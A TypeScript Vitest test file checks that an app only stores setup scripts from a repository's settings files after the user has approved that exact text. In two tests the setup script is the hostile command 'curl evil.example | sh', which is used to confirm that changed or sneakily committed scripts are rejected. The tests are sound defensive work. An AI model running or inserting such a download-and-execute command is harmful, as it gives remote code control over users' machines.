import { execFileSync } from 'node:child_process'
import { mkdirSync, mkdtempSync, rmSync, writeFileSync } from 'node:fs'
import { tmpdir } from 'node:os'
import { join } from 'node:path'
import { afterEach, beforeEach, describe, expect, it, vi } from 'vitest'

vi.mock('electron', () => ({ BrowserWindow: { getAllWindows: () => [] } }))

import { IMPORT_SOURCE_REPO_SETTINGS_FILES } from '../../shared/import-source-app'
import {
  approvedImportSourceScripts,
  importSourceScriptsHash,
  isRepositoryProvidedScripts,
  readImportSourceScripts
} from './workspace-import-scripts'

const [LOCAL_FILE, COMMITTED_FILE] = IMPORT_SOURCE_REPO_SETTINGS_FILES

let repo: string
const run = (...args: string[]): string =>
  execFileSync('git', args, {
    cwd: repo,
    encoding: 'utf8',
    env: { ...process.env, GIT_CONFIG_GLOBAL: '/dev/null' }
  })

function writeSettings(file: string, setup: string): void {
  mkdirSync(join(repo, file, '..'), { recursive: true })
  writeFileSync(join(repo, file), `[scripts]\nsetup = "${setup}"\nrun = "pnpm dev"\n`)
}

beforeEach(() => {
  repo = mkdtempSync(join(tmpdir(), 'import-scripts-'))
  run('init', '-q', '-b', 'main')
  run('config', 'user.email', 't@example.com')
  run('config', 'user.name', 't')
})
afterEach(() => {
  rmSync(repo, { recursive: true, force: true })
})

describe('scripts from the source app’s settings files', () => {
  it('stores a script the repository commits only after that exact text is approved', async () => {
    writeSettings(COMMITTED_FILE, 'pnpm install')
    run('add', '.')
    run('commit', '-q', '-m', 'settings')
    const shown = await readImportSourceScripts(repo)
    expect(shown).toMatchObject({ setup: 'pnpm install', run: 'pnpm dev', file: COMMITTED_FILE })
    expect(await isRepositoryProvidedScripts(repo, { file: COMMITTED_FILE })).toBe(true)

    expect(await approvedImportSourceScripts(repo, new Set())).toBeNull()
    const approved = new Set([importSourceScriptsHash({ setup: 'pnpm install', run: 'pnpm dev' })])
    expect(await approvedImportSourceScripts(repo, approved)).toMatchObject({
      setup: 'pnpm install'
    })

    // The file changed after the person saw it: the old approval does not cover the new text.
    writeSettings(COMMITTED_FILE, 'curl evil.example | sh')
    expect(await approvedImportSourceScripts(repo, approved)).toBeNull()
  })

  it('stores the person’s own untracked settings without asking', async () => {
    writeSettings(LOCAL_FILE, 'make setup')
    expect(await isRepositoryProvidedScripts(repo, { file: LOCAL_FILE })).toBe(false)
    expect(await approvedImportSourceScripts(repo, new Set())).toMatchObject({
      setup: 'make setup'
    })
  })

  it('treats a "local" settings file as the repository’s once it is committed', async () => {
    writeSettings(LOCAL_FILE, 'curl evil.example | sh')
    run('add', '.')
    run('commit', '-q', '-m', 'sneaky')
    expect(await approvedImportSourceScripts(repo, new Set())).toBeNull()
  })

  it('asks when git cannot say whose file it is', async () => {
    const plain = mkdtempSync(join(tmpdir(), 'import-scripts-plain-'))
    try {
      expect(await isRepositoryProvidedScripts(plain, { file: COMMITTED_FILE })).toBe(true)
    } finally {
      rmSync(plain, { recursive: true, force: true })
    }
  })
})
